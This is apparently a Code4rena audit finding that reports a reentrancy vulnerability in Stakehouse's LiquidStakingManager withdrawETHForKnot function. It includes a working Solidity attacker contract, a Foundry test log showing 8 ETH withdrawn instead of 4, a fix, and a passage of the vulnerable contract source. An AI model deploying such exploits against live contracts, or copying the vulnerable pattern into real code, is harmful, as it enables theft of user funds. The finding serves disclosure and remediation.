{
  "Title": "[H-05] Reentrancy in LiquidStakingManager.sol#withdrawETHForKnow leads to loss of fund from smart wallet",
  "Content": "# Lines of code\n\nhttps://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L435\nhttps://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L326\nhttps://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L340\nhttps://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L347\n\n\n# Vulnerability details\n\n## Impact\n\nReentrancy in LiquidStakingManager.sol#withdrawETHForKnow leads to loss of fund from smart wallet\n\n## Proof of Concept\n\nthe code below violates the check effect pattern, the code banned the public key to mark the public key invalid to not let the msg.sender withdraw again after sending the ETH.\n\n```solidity\n    /// @notice Allow node runners to withdraw ETH from their smart wallet. ETH can only be withdrawn until the KNOT has not been staked.\n    /// @dev A banned node runner cannot withdraw ETH for the KNOT. \n    /// @param _blsPublicKeyOfKnot BLS public key of the KNOT for which the ETH needs to be withdrawn\n    function withdrawETHForKnot(address _recipient, bytes calldata _blsPublicKeyOfKnot) external {\n        require(_recipient != address(0), \"Zero address\");\n        require(isBLSPublicKeyBanned(_blsPublicKeyOfKnot) == false, \"BLS public key has already withdrawn or not a part of LSD network\");\n\n        address associatedSmartWallet = smartWalletOfKnot[_blsPublicKeyOfKnot];\n        require(smartWalletOfNodeRunner[msg.sender] == associatedSmartWallet, \"Not the node runner for the smart wallet \");\n        require(isNodeRunnerBanned(nodeRunnerOfSmartWallet[associatedSmartWallet]) == false, \"Node runner is banned from LSD network\");\n        require(associatedSmartWallet.balance >= 4 ether, \"Insufficient balance\");\n        require(\n            getAccountManager().blsPublicKeyToLifecycleStatus(_blsPublicKeyOfKnot) == IDataStructures.LifecycleStatus.INITIALS_REGISTERED,\n            \"Initials not registered\"\n        );\n\n        // refund 4 ether from smart wallet to node runner's EOA\n        IOwnableSmartWallet(associatedSmartWallet).rawExecute(\n            _recipient,\n            \"\",\n            4 ether\n        );\n\n        // update the mapping\n        bannedBLSPublicKeys[_blsPublicKeyOfKnot] = associatedSmartWallet;\n\n        emit ETHWithdrawnFromSmartWallet(associatedSmartWallet, _blsPublicKeyOfKnot, msg.sender);\n    }\n```\n\nnote the section:\n\n```solidity\n// refund 4 ether from smart wallet to node runner's EOA\nIOwnableSmartWallet(associatedSmartWallet).rawExecute(\n\t_recipient,\n\t\"\",\n\t4 ether\n);\n\n// update the mapping\nbannedBLSPublicKeys[_blsPublicKeyOfKnot] = associatedSmartWallet;\n```\n\nif the _recipient is a smart contract, it can re-enter the withdraw function to withdraw another 4 ETH multiple times before the public key is banned.\n\nAs shown in our running POC.\n\nWe need to add the import first: \n\n```solidity\nimport { MockAccountManager } from \"../../contracts/testing/stakehouse/MockAccountManager.sol\";\n```\n\nWe can add the smart contract below:\n\nhttps://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/test/foundry/LiquidStakingManager.t.sol#L12\n\n```solidity\ninterface IManager {\n    function registerBLSPublicKeys(\n        bytes[] calldata _blsPublicKeys,\n        bytes[] calldata _blsSignatures,\n        address _eoaRepresentative\n    ) external payable;\n    function withdrawETHForKnot(\n        address _recipient, \n        bytes calldata _blsPublicKeyOfKnot\n    ) external;\n}\n\ncontract NonEOARepresentative {\n\n    address manager;\n    bool state;\n\n    constructor(address _manager) payable {\n\n        bytes[] memory publicKeys = new bytes[](2);\n        publicKeys[0] = \"publicKeys1\";\n        publicKeys[1] = \"publicKeys2\";\n\n        bytes[] memory signature = new bytes[](2);\n        signature[0] = \"signature1\";\n        signature[1] = \"signature2\";\n\n        IManager(_manager).registerBLSPublicKeys{value: 8 ether}(\n            publicKeys,\n            signature,\n            address(this)\n        );\n\n        manager = _manager;\n\n    }\n\n    function withdraw(bytes calldata _blsPublicKeyOfKnot) external {\n        IManager(manager).withdrawETHForKnot(address(this), _blsPublicKeyOfKnot);\n    }\n\n    receive() external payable {\n        if(!state) {\n            state = true;\n            this.withdraw(\"publicKeys1\");\n        }\n    }\n\n}\n```\n\nthere is a restriction in this reentrancy attack, the msg.sender needs to be the same recipient when calling withdrawETHForKnot.\n\nWe add the test case.\n\nhttps://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/test/foundry/LiquidStakingManager.t.sol#L35\n\n```solidity\nfunction testBypassIsContractCheck_POC() public {\n\n\tNonEOARepresentative pass = new NonEOARepresentative{value: 8 ether}(address(manager));\n\taddress wallet = manager.smartWalletOfNodeRunner(address(pass));\n\taddress reprenstative = manager.smartWalletRepresentative(wallet);\n\tconsole.log(\"smart contract registered as a EOA representative\");\n\tconsole.log(address(reprenstative) == address(pass));\n\n\t// to set the public key state to IDataStructures.LifecycleStatus.INITIALS_REGISTERED\n\tMockAccountManager(factory.accountMan()).setLifecycleStatus(\"publicKeys1\", 1);\n\n\t// expected to withdraw 4 ETHER, but reentrancy allows withdrawing 8 ETHER\n\tpass.withdraw(\"publicKeys1\");\n\tconsole.log(\"balance after the withdraw, expected 4 ETH, but has 8 ETH\");\n\tconsole.log(address(pass).balance);\n\n}\n```\n\nwe run the test:\n\n```solidity\nforge test -vv --match testWithdraw_Reentrancy_POC\n```\n\nand the result is\n\n```solidity\nRunning 1 test for test/foundry/LiquidStakingManager.t.sol:LiquidStakingManagerTests\n[PASS] testWithdraw_Reentrancy_POC() (gas: 578021)\nLogs:\n  smart contract registered as a EOA representative\n  true\n  balance after the withdraw, expected 4 ETH, but has 8 ETH\n  8000000000000000000\n\nTest result: ok. 1 passed; 0 failed; finished in 14.85ms\n```\n\nthe function call is \n\npass.withdraw(\"publicKeys1\"), which calls\n\n```solidity\nfunction withdraw(bytes calldata _blsPublicKeyOfKnot) external {\n\tIManager(manager).withdrawETHForKnot(address(this), _blsPublicKeyOfKnot);\n}\n```\n\nwhich trigger:\n\n```solidity\n// refund 4 ether from smart wallet to node runner's EOA\nIOwnableSmartWallet(associatedSmartWallet).rawExecute(\n\t_recipient,\n\t\"\",\n\t4 ether\n);\n```\n\nwhich triggers reentrancy to withdraw the fund again before the public key is banned.\n\n```solidity\nreceive() external payable {\n\tif(!state) {\n\t\tstate = true;\n\t\tthis.withdraw(\"publicKeys1\");\n\t}\n}\n```\n\n\n## Tools Used\n\nManual Review\n\n## Recommended Mitigation Steps\n\nWe recommend ban the public key first then send the fund out, and use openzeppelin nonReentrant modifier to avoid reentrancy.\n\n```solidity\n\n// update the mapping\nbannedBLSPublicKeys[_blsPublicKeyOfKnot] = associatedSmartWallet;\n\n// refund 4 ether from smart wallet to node runner's EOA\nIOwnableSmartWallet(associatedSmartWallet).rawExecute(\n\t_recipient,\n\t\"\",\n\t4 ether\n);\n```",
  "Impact": "HIGH",
  "Source": "https://code4rena.com/contests/2022-11-lsd-network-stakehouse-contest",
  "Code": [
    {
      "filename": "contracts/liquid-staking/LiquidStakingManager.sol",
      "content": "// SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.13;\n\nimport { Initializable } from \"@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol\";\nimport { Ownable } from \"@openzeppelin/contracts/access/Ownable.sol\";\nimport { IERC20 } from \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\nimport { ReentrancyGuard } from \"@openzeppelin/contracts/security/ReentrancyGuard.sol\";\nimport { Address } from \"@openzeppelin/contracts/utils/Address.sol\";\n\nimport { StakehouseAPI } from \"@blockswaplab/stakehouse-solidity-api/contracts/StakehouseAPI.sol\";\nimport { ITransactionRouter } from \"@blockswaplab/stakehouse-contract-interfaces/contracts/interfaces/ITransactionRouter.sol\";\nimport { IDataStructures } from \"@blockswaplab/stakehouse-contract-interfaces/contracts/interfaces/IDataStructures.sol\";\nimport { IStakeHouseRegistry } from \"@blockswaplab/stakehouse-contract-interfaces/contracts/interfaces/IStakeHouseRegistry.sol\";\n\nimport { SavETHVaultDeployer } from \"./SavETHVaultDeployer.sol\";\nimport { StakingFundsVaultDeployer } from \"./StakingFundsVaultDeployer.sol\";\nimport { StakingFundsVault } from \"./StakingFundsVault.sol\";\nimport { SavETHVault } from \"./SavETHVault.sol\";\nimport { LPToken } from \"./LPToken.sol\";\nimport { LPTokenFactory } from \"./LPTokenFactory.sol\";\nimport { SyndicateFactory } from \"../syndicate/SyndicateFactory.sol\";\nimport { Syndicate } from \"../syndicate/Syndicate.sol\";\nimport { OptionalHouseGatekeeper } from \"./OptionalHouseGatekeeper.sol\";\nimport { OptionalGatekeeperFactory } from \"./OptionalGatekeeperFactory.sol\";\nimport { OwnableSmartWalletFactory } from \"../smart-wallet/OwnableSmartWalletFactory.sol\";\nimport { IOwnableSmartWalletFactory } from \"../smart-wallet/interfaces/IOwnableSmartWalletFactory.sol\";\nimport { IOwnableSmartWallet } from \"../smart-wallet/interfaces/IOwnableSmartWallet.sol\";\nimport { ISyndicateFactory } from \"../interfaces/ISyndicateFactory.sol\";\nimport { ILiquidStakingManager } from \"../interfaces/ILiquidStakingManager.sol\";\nimport { IBrandNFT } from \"../interfaces/IBrandNFT.sol\";\n\ncontract LiquidStakingManager is ILiquidStakingManager, Initializable, ReentrancyGuard, StakehouseAPI {\n\n    /// @notice signalize change in status of whitelisting\n    event WhitelistingStatusChanged(address indexed dao, bool updatedStatus);\n\n    /// @notice signalize updated whitelist status of node runner\n    event NodeRunnerWhitelistingStatusChanged(address indexed nodeRunner, bool updatedStatus);\n\n    /// @notice signalize creation of a new smart wallet\n    event SmartWalletCreated(address indexed smartWallet, address indexed nodeRunner);\n\n    /// @notice signalize appointing of a representative for a smart wallet by the node runner\n    event RepresentativeAppointed(address indexed smartWallet, address indexed eoaRepresentative);\n\n    /// @notice signalize wallet being credited with ETH\n    event WalletCredited(address indexed smartWallet, uint256 amount);\n\n    /// @notice signalize staking of a KNOT\n    event KnotStaked(bytes _blsPublicKeyOfKnot, address indexed trigerringAddress);\n\n    /// @notice signalize creation of stakehouse\n    event StakehouseCreated(string stakehouseTicker, address indexed stakehouse);\n\n    /// @notice signalize joining a stakehouse\n    event StakehouseJoined(bytes blsPubKey);\n\n    ///@notice signalize removal of representative from smart wallet\n    event RepresentativeRemoved(address indexed smartWallet, address indexed eoaRepresentative);\n\n    /// @notice signalize dormant representative\n    event DormantRepresentative(address indexed associatedSmartWallet, address representative);\n\n    /// @notice signalize refund of withdrawal of 4 ETH for a BLS public key by the node runner\n    event ETHWithdrawnFromSmartWallet(address indexed associatedSmartWallet, bytes blsPublicKeyOfKnot, address nodeRunner);\n\n    /// @notice signalize that the network has updated its ticker before its house was created\n    event NetworkTickerUpdated(string newTicker);\n\n    /// @notice signalize that the node runner has claimed rewards from the syndicate\n    event NodeRunnerRewardsClaimed(address indexed nodeRunner, address indexed recipient);\n\n    /// @notice signalize that the node runner of the smart wallet has been rotated\n    event NodeRunnerOfSmartWalletRotated(address indexed wallet, address indexed oldRunner, address indexed newRunner);\n\n    /// @notice signalize banning of a node runner\n    event NodeRunnerBanned(address indexed nodeRunner);\n\n    /// @notice signalize that the dao management address has been moved\n    event UpdateDAOAddress(address indexed oldAddress, address indexed newAddress);\n\n    /// @notice signalize that the dao commission from network revenue has been updated\n    event DAOCommissionUpdated(uint256 old, uint256 newCommission);\n\n    /// @notice signalize that a new BLS public key for an LSD validator has been registered\n    event NewLSDValidatorRegistered(address indexed nodeRunner, bytes blsPublicKey);\n\n    /// @notice Address of brand NFT\n    address public brand;\n\n    /// @notice stakehouse created by the LSD network\n    address public override stakehouse;\n\n    /// @notice Fees and MEV EIP1559 distribution contract for the LSD network\n    address public syndicate;\n\n    /// @notice address of the DAO deploying the contract\n    address public dao;\n\n    /// @notice address of optional gatekeeper for admiting new knots to the house created by the network\n    OptionalHouseGatekeeper public gatekeeper;\n\n    /// @notice instance of the syndicate factory that deploys the syndicates\n    ISyndicateFactory public syndicateFactory;\n\n    /// @notice instance of the smart wallet factory that deploys the smart wallets for node runners\n    IOwnableSmartWalletFactory public smartWalletFactory;\n\n    /// @notice string name for the stakehouse 3-5 characters long\n    string public stakehouseTicker;\n\n    /// @notice DAO staking funds vault\n    StakingFundsVault public stakingFundsVault;\n\n    /// @notice SavETH vault\n    SavETHVault public savETHVault;\n\n    /// @notice whitelisting indicator. true for enables and false for disabled\n    bool public enableWhitelisting;\n\n    /// @notice mapping to store if a node runner is whitelisted\n    mapping(address => bool) public isNodeRunnerWhitelisted;\n\n    /// @notice EOA representative appointed for a smart wallet\n    mapping(address => address) public smartWalletRepresentative;\n\n    /// @notice Smart wallet used to deploy KNOT\n    mapping(bytes => address) public smartWalletOfKnot;\n\n    /// @notice Smart wallet issued to the Node runner. Node runner address <> Smart wallet address\n    mapping(address => address) public smartWalletOfNodeRunner;\n\n    /// @notice Node runner issued to Smart wallet. Smart wallet address <> Node runner address\n    mapping(address => address) public nodeRunnerOfSmartWallet;\n\n    /// @notice Track number of staked KNOTs of a smart wallet\n    mapping(address => uint256) public stakedKnotsOfSmartWallet;\n\n    /// @notice smart wallet <> dormant rep.\n    mapping(address => address) public smartWalletDormantRepresentative;\n\n    /// @notice Track BLS public keys that have been banned. \n    /// If banned, the BLS public key will be mapped to its respective smart wallet\n    mapping(bytes => address) public bannedBLSPublicKeys;\n\n    /// @notice Track node runner addresses that are banned.\n    /// Malicious node runners can be banned by the DAO\n    mapping(address => bool) public bannedNodeRunners;\n\n    /// @notice count of KNOTs interacted with LSD network\n    uint256 public numberOfKnots;\n\n    /// @notice Commission percentage to 5 decimal places\n    uint256 public daoCommissionPercentage;\n\n    /// @notice 100% to 5 decimal places\n    uint256 public MODULO = 100_00000;\n\n    modifier onlyDAO() {\n        require(msg.sender == dao, \"Must be DAO\");\n        _;\n    }\n\n    /// @custom:oz-upgrades-unsafe-allow constructor\n    constructor() initializer {}\n\n    /// @inheritdoc ILiquidStakingManager\n    function init(\n        address _dao,\n        address _syndicateFactory,\n        address _smartWalletFactory,\n        address _lpTokenFactory,\n        address _brand,\n        address _savETHVaultDeployer,\n        address _stakingFundsVaultDeployer,\n        address _optionalGatekeeperDeployer,\n        uint256 _optionalCommission,\n        bool _deployOptionalGatekeeper,\n        string calldata _stakehouseTicker\n    ) external virtual override initializer {\n        _init(\n            _dao,\n            _syndicateFactory,\n            _smartWalletFactory,\n            _lpTokenFactory,\n            _brand,\n            _savETHVaultDeployer,\n            _stakingFundsVaultDeployer,\n            _optionalGatekeeperDeployer,\n            _optionalCommission,\n            _deployOptionalGatekeeper,\n            _stakehouseTicker\n        );\n    }\n\n    /// @notice Enable operations proxied through DAO contract to another contract\n    /// @param _nodeRunner Address of the node runner that created the wallet\n    /// @param _to Address of the target contract\n    /// @param _data Encoded data of the function call\n    /// @param _value Total value attached to the transaction\n    function executeAsSmartWallet(\n        address _nodeRunner,\n        address _to,\n        bytes calldata _data,\n        uint256 _value\n    ) external payable onlyDAO {\n        address smartWallet = smartWalletOfNodeRunner[_nodeRunner];\n        require(smartWallet != address(0), \"No wallet found\");\n        IOwnableSmartWallet(smartWallet).execute(\n            _to,\n            _data,\n            _value\n        );\n    }\n\n    /// @notice For knots no longer operational, DAO can de register the knot from the syndicate\n    function deRegisterKnotFromSyndicate(bytes[] calldata _blsPublicKeys) external onlyDAO {\n        Syndicate(payable(syndicate)).deRegisterKnots(_blsPublicKeys);\n    }\n\n    /// @notice In preparation of a rage quit, restore sETH to a smart wallet which are recoverable with the execution methods in the event this step does not go to plan\n    /// @param _smartWallet Address of the smart wallet that will undertake the rage quit\n    /// @param _blsPublicKeys List of BLS public keys being processed (assuming DAO only has BLS pub keys from correct smart wallet)\n    /// @param _amounts Amounts of free floating sETH that will be unstaked\n    function restoreFreeFloatingSharesToSmartWalletForRageQuit(\n        address _smartWallet,\n        bytes[] calldata _blsPublicKeys,\n        uint256[] calldata _amounts\n    ) external onlyDAO {\n        stakingFundsVault.unstakeSyndicateSharesForRageQuit(\n            _smartWallet,\n            _blsPublicKeys,\n            _amounts\n        );\n    }\n\n    /// @notice Allow DAO to migrate to a new address\n    function updateDAOAddress(address _newAddress) external onlyDAO {\n        require(_newAddress != address(0), \"Zero address\");\n        require(_newAddress != dao, \"Same address\");\n\n        emit UpdateDAOAddress(dao, _newAddress);\n\n        dao = _newAddress;\n    }\n\n    /// @notice Allow DAO to take a commission of network revenue\n    function updateDAORevenueCommission(uint256 _commissionPercentage) external onlyDAO {\n        require(_commissionPercentage != daoCommissionPercentage, \"Same commission percentage\");\n        _updateDAORevenueCommission(_commissionPercentage);\n    }\n\n    /// @notice Allow the DAO to rotate the network ticker before the network house is created\n    function updateTicker(string calldata _newTicker) external onlyDAO {\n        require(bytes(_newTicker).length >= 3, \"String must be 3-5 characters long\");\n        require(bytes(_newTicker).length <= 5, \"String must be 3-5 characters long\");\n        require(numberOfKnots == 0, \"Cannot change ticker once house is created\");\n\n        stakehouseTicker = _newTicker;\n\n        emit NetworkTickerUpdated(_newTicker);\n    }\n\n    /// @notice function to change whether node runner whitelisting of node runners is required by the DAO\n    /// @param _changeWhitelist boolean value. true to enable and false to disable\n    function updateWhitelisting(bool _changeWhitelist) external onlyDAO returns (bool) {\n        require(_changeWhitelist != enableWhitelisting, \"Unnecessary update to same status\");\n        enableWhitelisting = _changeWhitelist;\n        emit WhitelistingStatusChanged(msg.sender, enableWhitelisting);\n\n        return enableWhitelisting;\n    }\n\n    /// @notice function to enable/disable whitelisting of a noderunner\n    /// @param _nodeRunner address of the node runner\n    /// @param isWhitelisted true if the node runner should be whitelisted. false otherwise.\n    function updateNodeRunnerWhitelistStatus(address _nodeRunner, bool isWhitelisted) external onlyDAO {\n        require(_nodeRunner != address(0), \"Zero address\");\n        require(isNodeRunnerWhitelisted[_nodeRunner] != isNodeRunnerWhitelisted[_nodeRunner], \"Unnecessary update to same status\");\n\n        isNodeRunnerWhitelisted[_nodeRunner] = isWhitelisted;\n        emit NodeRunnerWhitelistingStatusChanged(_nodeRunner, isWhitelisted);\n    }\n\n    /// @notice Allow a node runner to rotate the EOA representative they use for their smart wallet\n    /// @dev if any KNOT is staked for a smart wallet, no rep can be appointed or updated until the derivatives are minted\n    /// @param _newRepresentative address of the new representative to be appointed\n    function rotateEOARepresentative(address _newRepresentative) external {\n        require(_newRepresentative != address(0), \"Zero address\");\n        require(isNodeRunnerBanned(msg.sender) == false, \"Node runner is banned from LSD network\");\n\n        address smartWallet = smartWalletOfNodeRunner[msg.sender];\n        require(smartWallet != address(0), \"No smart wallet\");\n        require(stakedKnotsOfSmartWallet[smartWallet] == 0, \"Not all KNOTs are minted\");\n        require(smartWalletRepresentative[smartWallet] != _newRepresentative, \"Invalid rotation to same EOA\");\n\n        // unauthorize old representative\n        _authorizeRepresentative(smartWallet, smartWalletRepresentative[smartWallet], false);\n\n        // authorize new representative\n        _authorizeRepresentative(smartWallet, _newRepresentative, true);\n    }\n\n    /// @notice Allow DAO to rotate representative in the case that node runner is not available (to facilitate staking)\n    /// @param _nodeRunner address of the node runner\n    /// @param _newRepresentative address of the new representative to be appointed for the node runner\n    function rotateEOARepresentativeOfNodeRunner(address _nodeRunner, address _newRepresentative) external onlyDAO {\n        require(_newRepresentative != address(0), \"Zero address\");\n\n        address smartWallet = smartWalletOfNodeRunner[_nodeRunner];\n        require(smartWallet != address(0), \"No smart wallet\");\n        require(stakedKnotsOfSmartWallet[smartWallet] == 0, \"Not all KNOTs are minted\");\n        require(smartWalletRepresentative[smartWallet] != _newRepresentative, \"Invalid rotation to same EOA\");\n\n        // unauthorize old representative\n        _authorizeRepresentative(smartWallet, smartWalletRepresentative[smartWallet], false);\n\n        // authorize new representative\n        _authorizeRepresentative(smartWallet, _newRepresentative, true);\n    }\n\n    /// @notice Allow node runners to withdraw ETH from their smart wallet. ETH can only be withdrawn until the KNOT has not been staked.\n    /// @dev A banned node runner cannot withdraw ETH for the KNOT. \n    /// @param _blsPublicKeyOfKnot BLS public key of the KNOT for which the ETH needs to be withdrawn\n    function withdrawETHForKnot(address _recipient, bytes calldata _blsPublicKeyOfKnot) external {\n        require(_recipient != address(0), \"Zero address\");\n        require(isBLSPublicKeyBanned(_blsPublicKeyOfKnot) == false, \"BLS public key has already withdrawn or not a part of LSD network\");\n\n        address associatedSmartWallet = smartWalletOfKnot[_blsPublicKeyOfKnot];\n        require(smartWalletOfNodeRunner[msg.sender] == associatedSmartWallet, \"Not the node runner for the smart wallet \");\n        require(isNodeRunnerBanned(nodeRunnerOfSmartWallet[associatedSmartWallet]) == false, \"Node runner is banned from LSD network\");\n        require(associatedSmartWallet.balance >= 4 ether, \"Insufficient balance\");\n        require(\n            getAccountManager().blsPublicKeyToLifecycleStatus(_blsPublicKeyOfKnot) == IDataStructures.LifecycleStatus.INITIALS_REGISTERED,\n            \"Initials not registered\"\n        );\n\n        // refund 4 ether from smart wallet to node runner's EOA\n        IOwnableSmartWallet(associatedSmartWallet).rawExecute(\n            _recipient,\n            \"\",\n            4 ether\n        );\n\n        // update the mapping\n        bannedBLSPublicKeys[_blsPublicKeyOfKnot] = associatedSmartWallet;\n\n        emit ETHWithdrawnFromSmartWallet(associatedSmartWallet, _blsPublicKeyOfKnot, msg.sender);\n    }\n\n    /// @notice In the event the node runner coordinates with the DAO to sell their wallet, allow rotation\n    /// @dev EOA representative rotation done outside this method because there may be knots currently staked etc.\n    /// @param _current address of the present node runner of the smart wallet\n    /// @param _new address of the new node runner of the smart wallet\n    function rotateNodeRunnerOfSmartWallet(address _current, address _new, bool _wasPreviousNodeRunnerMalicious) external {\n        require(_new != address(0) && _current != _new, \"New is zero or current\");\n\n        address wallet = smartWalletOfNodeRunner[_current];\n        require(wallet != address(0), \"Wallet does not exist\");\n        require(_current == msg.sender || dao == msg.sender, \"Not current owner or DAO\");\n\n        address newRunnerCurrentWallet = smartWalletOfNodeRunner[_new];\n        require(newRunnerCurrentWallet == address(0), \"New runner has a wallet\");\n\n        smartWalletOfNodeRunner[_new] = wallet;\n        nodeRunnerOfSmartWallet[wallet] = _new;\n\n        delete smartWalletOfNodeRunner[_current];\n\n        if (msg.sender == dao && _wasPreviousNodeRunnerMalicious) {\n            bannedNodeRunners[_current] = true;\n            emit NodeRunnerBanned(_current);\n        }\n\n        emit NodeRunnerOfSmartWalletRotated(wallet, _current, _new);\n    }\n\n    /// @notice function to allow a node runner to claim ETH from the syndicate from their smart wallet\n    /// @param _recipient End recipient of ETH from syndicate rewards\n    /// @param _blsPubKeys list of BLS public keys to claim reward for\n    function claimRewardsAsNodeRunner(\n        address _recipient,\n        bytes[] calldata _blsPubKeys\n    ) external nonReentrant {\n        require(_blsPubKeys.length > 0, \"No BLS keys specified\");\n        require(_recipient != address(0), \"Zero address\");\n\n        address smartWallet = smartWalletOfNodeRunner[msg.sender];\n        require(smartWallet != address(0), \"Unknown node runner\");\n\n        for(uint256 i; i < _blsPubKeys.length; ++i) {\n            require(isBLSPublicKeyBanned(_blsPubKeys[i]) == false, \"BLS public key is banned or not a part of LSD network\");\n\n            // check that the node runner doesn't claim rewards for KNOTs from other smart wallets\n            require(smartWalletOfKnot[_blsPubKeys[i]] == smartWallet, \"BLS public key doesn't belong to the node runner\");\n        }\n\n        // Fetch ETH accrued\n        uint256 balBefore = address(this).balance;\n        IOwnableSmartWallet(smartWallet).execute(\n            syndicate,\n            abi.encodeWithSelector(\n                Syndicate.claimAsCollateralizedSLOTOwner.selector,\n                address(this),\n                _blsPubKeys\n            )\n        );\n\n        (uint256 nodeRunnerAmount, uint256 daoAmount) = _calculateCommission(address(this).balance - balBefore);\n        (bool transferResult, ) = _recipient.call{value: nodeRunnerAmount}(\"\");\n        require(transferResult, \"Failed to transfer\");\n\n        if (daoAmount > 0) {\n            (transferResult, ) = dao.call{value: daoAmount}(\"\");\n            require(transferResult, \"Failed to transfer\");\n        }\n\n        emit NodeRunnerRewardsClaimed(msg.sender, _recipient);\n    }\n\n    /// @notice register a node runner to LSD by creating a new smart wallet\n    /// @param _blsPublicKeys list of BLS public keys\n    /// @param _blsSignatures list of BLS signatures\n    /// @param _eoaRepresentative EOA representative of wallet\n    function registerBLSPublicKeys(\n        bytes[] calldata _blsPublicKeys,\n        bytes[] calldata _blsSignatures,\n        address _eoaRepresentative\n    ) external payable nonReentrant {\n        uint256 len = _blsPublicKeys.length;\n        require(len >= 1, \"No value provided\");\n        require(len == _blsSignatures.length, \"Unequal number of array values\");\n        require(msg.value == len * 4 ether, \"Insufficient ether provided\");\n        require(!Address.isContract(_eoaRepresentative), \"Only EOA representative permitted\");\n        require(_isNodeRunnerValid(msg.sender) == true, \"Unrecognised node runner\");\n        require(isNodeRunnerBanned(msg.sender) == false, \"Node runner is banned from LSD network\");\n\n        address smartWallet = smartWalletOfNodeRunner[msg.sender];\n\n        if(smartWallet == address(0)) {\n            // create new wallet owned by liquid staking manager\n            smartWallet = smartWalletFactory.createWallet(address(this));\n            emit SmartWalletCreated(smartWallet, msg.sender);\n\n            // associate node runner with the newly created wallet\n            smartWalletOfNodeRunner[msg.sender] = smartWallet;\n            nodeRunnerOfSmartWallet[smartWallet] = msg.sender;\n\n            _authorizeRepresentative(smartWallet, _eoaRepresentative, true);\n        }\n\n        // Ensure that the node runner does not whitelist multiple EOA representatives - they can only have 1 active at a time\n        if(smartWalletRepresentative[smartWallet] != address(0)) {\n            require(smartWalletRepresentative[smartWallet] == _eoaRepresentative, \"Different EOA specified - rotate outside\");\n        }\n\n        {\n            // transfer ETH to smart wallet\n            (bool result,) = smartWallet.call{value: msg.value}(\"\");\n            require(result, \"Transfer failed\");\n            emit WalletCredited(smartWallet, msg.value);\n        }\n\n        for(uint256 i; i < len; ++i) {\n            bytes calldata _blsPublicKey = _blsPublicKeys[i];\n\n            // check if the BLS public key is part of LSD network and is not banned\n            require(isBLSPublicKeyPartOfLSDNetwork(_blsPublicKey) == false, \"BLS public key is banned or not a part of LSD network\");\n\n            require(\n                getAccountManager().blsPublicKeyToLifecycleStatus(_blsPublicKey) == IDataStructures.LifecycleStatus.UNBEGUN,\n                \"Lifecycle status must be zero\"\n            );\n\n            // register validtor initals for each of the KNOTs\n            IOwnableSmartWallet(smartWallet).execute(\n                address(getTransactionRouter()),\n                abi.encodeWithSelector(\n                    ITransactionRouter.registerValidatorInitials.selector,\n                    smartWallet,\n                    _blsPublicKey,\n                    _blsSignatures[i]\n                )\n            );\n\n            // register the smart wallet with the BLS public key\n            smartWalletOfKnot[_blsPublicKey] = smartWallet;\n\n            emit NewLSDValidatorRegistered(msg.sender, _blsPublicKey);\n        }\n    }\n\n    /// @inheritdoc ILiquidStakingManager\n    function isBLSPublicKeyPartOfLSDNetwork(bytes calldata _blsPublicKeyOfKnot) public virtual view returns (bool) {\n        return smartWalletOfKnot[_blsPublicKeyOfKnot] != address(0);\n    }\n\n    /// @inheritdoc ILiquidStakingManager\n    function isBLSPublicKeyBanned(bytes calldata _blsPublicKeyOfKnot) public virtual view returns (bool) {\n        return !isBLSPublicKeyPartOfLSDNetwork(_blsPublicKeyOfKnot) || bannedBLSPublicKeys[_blsPublicKeyOfKnot] != address(0);\n    }\n\n    /// @notice function to check if a node runner address is banned\n    /// @param _nodeRunner address of the node runner\n    /// @return true if the node runner is banned, false otherwise\n    function isNodeRunnerBanned(address _nodeRunner) public view returns (bool) {\n        return bannedNodeRunners[_nodeRunner];\n    }\n\n    /// @notice function to check if a KNOT is deregistered\n    /// @param _blsPublicKey BLS public key of the KNOT\n    /// @return true if the KNOT is deregistered, false otherwise\n    function isKnotDeregistered(bytes calldata _blsPublicKey) public view returns (bool) {\n        return Syndicate(payable(syndicate)).isNoLongerPartOfSyndicate(_blsPublicKey);\n    }\n\n    /// @notice Anyone can call this to trigger staking once they have all of the required input params from BLS authentication\n    /// @param _blsPublicKeyOfKnots List of knots being staked with the Ethereum deposit contract (32 ETH sourced within the network)\n    /// @param _ciphertexts List of backed up validator operations encrypted and stored to the Ethereum blockchain\n    /// @param _aesEncryptorKeys List of public identifiers of credentials that performed the trustless backup\n    /// @param _encryptionSignatures List of EIP712 signatures attesting to the correctness of the BLS signature\n    /// @param _dataRoots List of serialized SSZ containers of the DepositData message for each validator used by Ethereum deposit contract\n    function stake(\n        bytes[] calldata _blsPublicKeyOfKnots,\n        bytes[] calldata _ciphertexts,\n        bytes[] calldata _aesEncryptorKeys,\n        IDataStructures.EIP712Signature[] calldata _encryptionSignatures,\n        bytes32[] calldata _dataRoots\n    ) external {\n        uint256 numOfValidators = _blsPublicKeyOfKnots.length;\n        require(numOfValidators > 0, \"No data\");\n        require(numOfValidators == _ciphertexts.length, \"Inconsistent array lengths\");\n        require(numOfValidators == _aesEncryptorKeys.length, \"Inconsistent array lengths\");\n        require(numOfValidators == _encryptionSignatures.length, \"Inconsistent array lengths\");\n        require(numOfValidators == _dataRoots.length, \"Inconsistent array lengths\");\n\n        for (uint256 i; i < numOfValidators; ++i) {\n            bytes calldata blsPubKey = _blsPublicKeyOfKnots[i];\n            // check if BLS public key is registered with liquid staking derivative network and not banned\n            require(isBLSPublicKeyBanned(blsPubKey) == false, \"BLS public key is banned or not a part of LSD network\");\n\n            address associatedSmartWallet = smartWalletOfKnot[blsPubKey];\n            require(associatedSmartWallet != address(0), \"Unknown BLS public key\");\n            require(\n                getAccountManager().blsPublicKeyToLifecycleStatus(blsPubKey) == IDataStructures.LifecycleStatus.INITIALS_REGISTERED,\n                \"Initials not registered\"\n            );\n\n            // check minimum balance 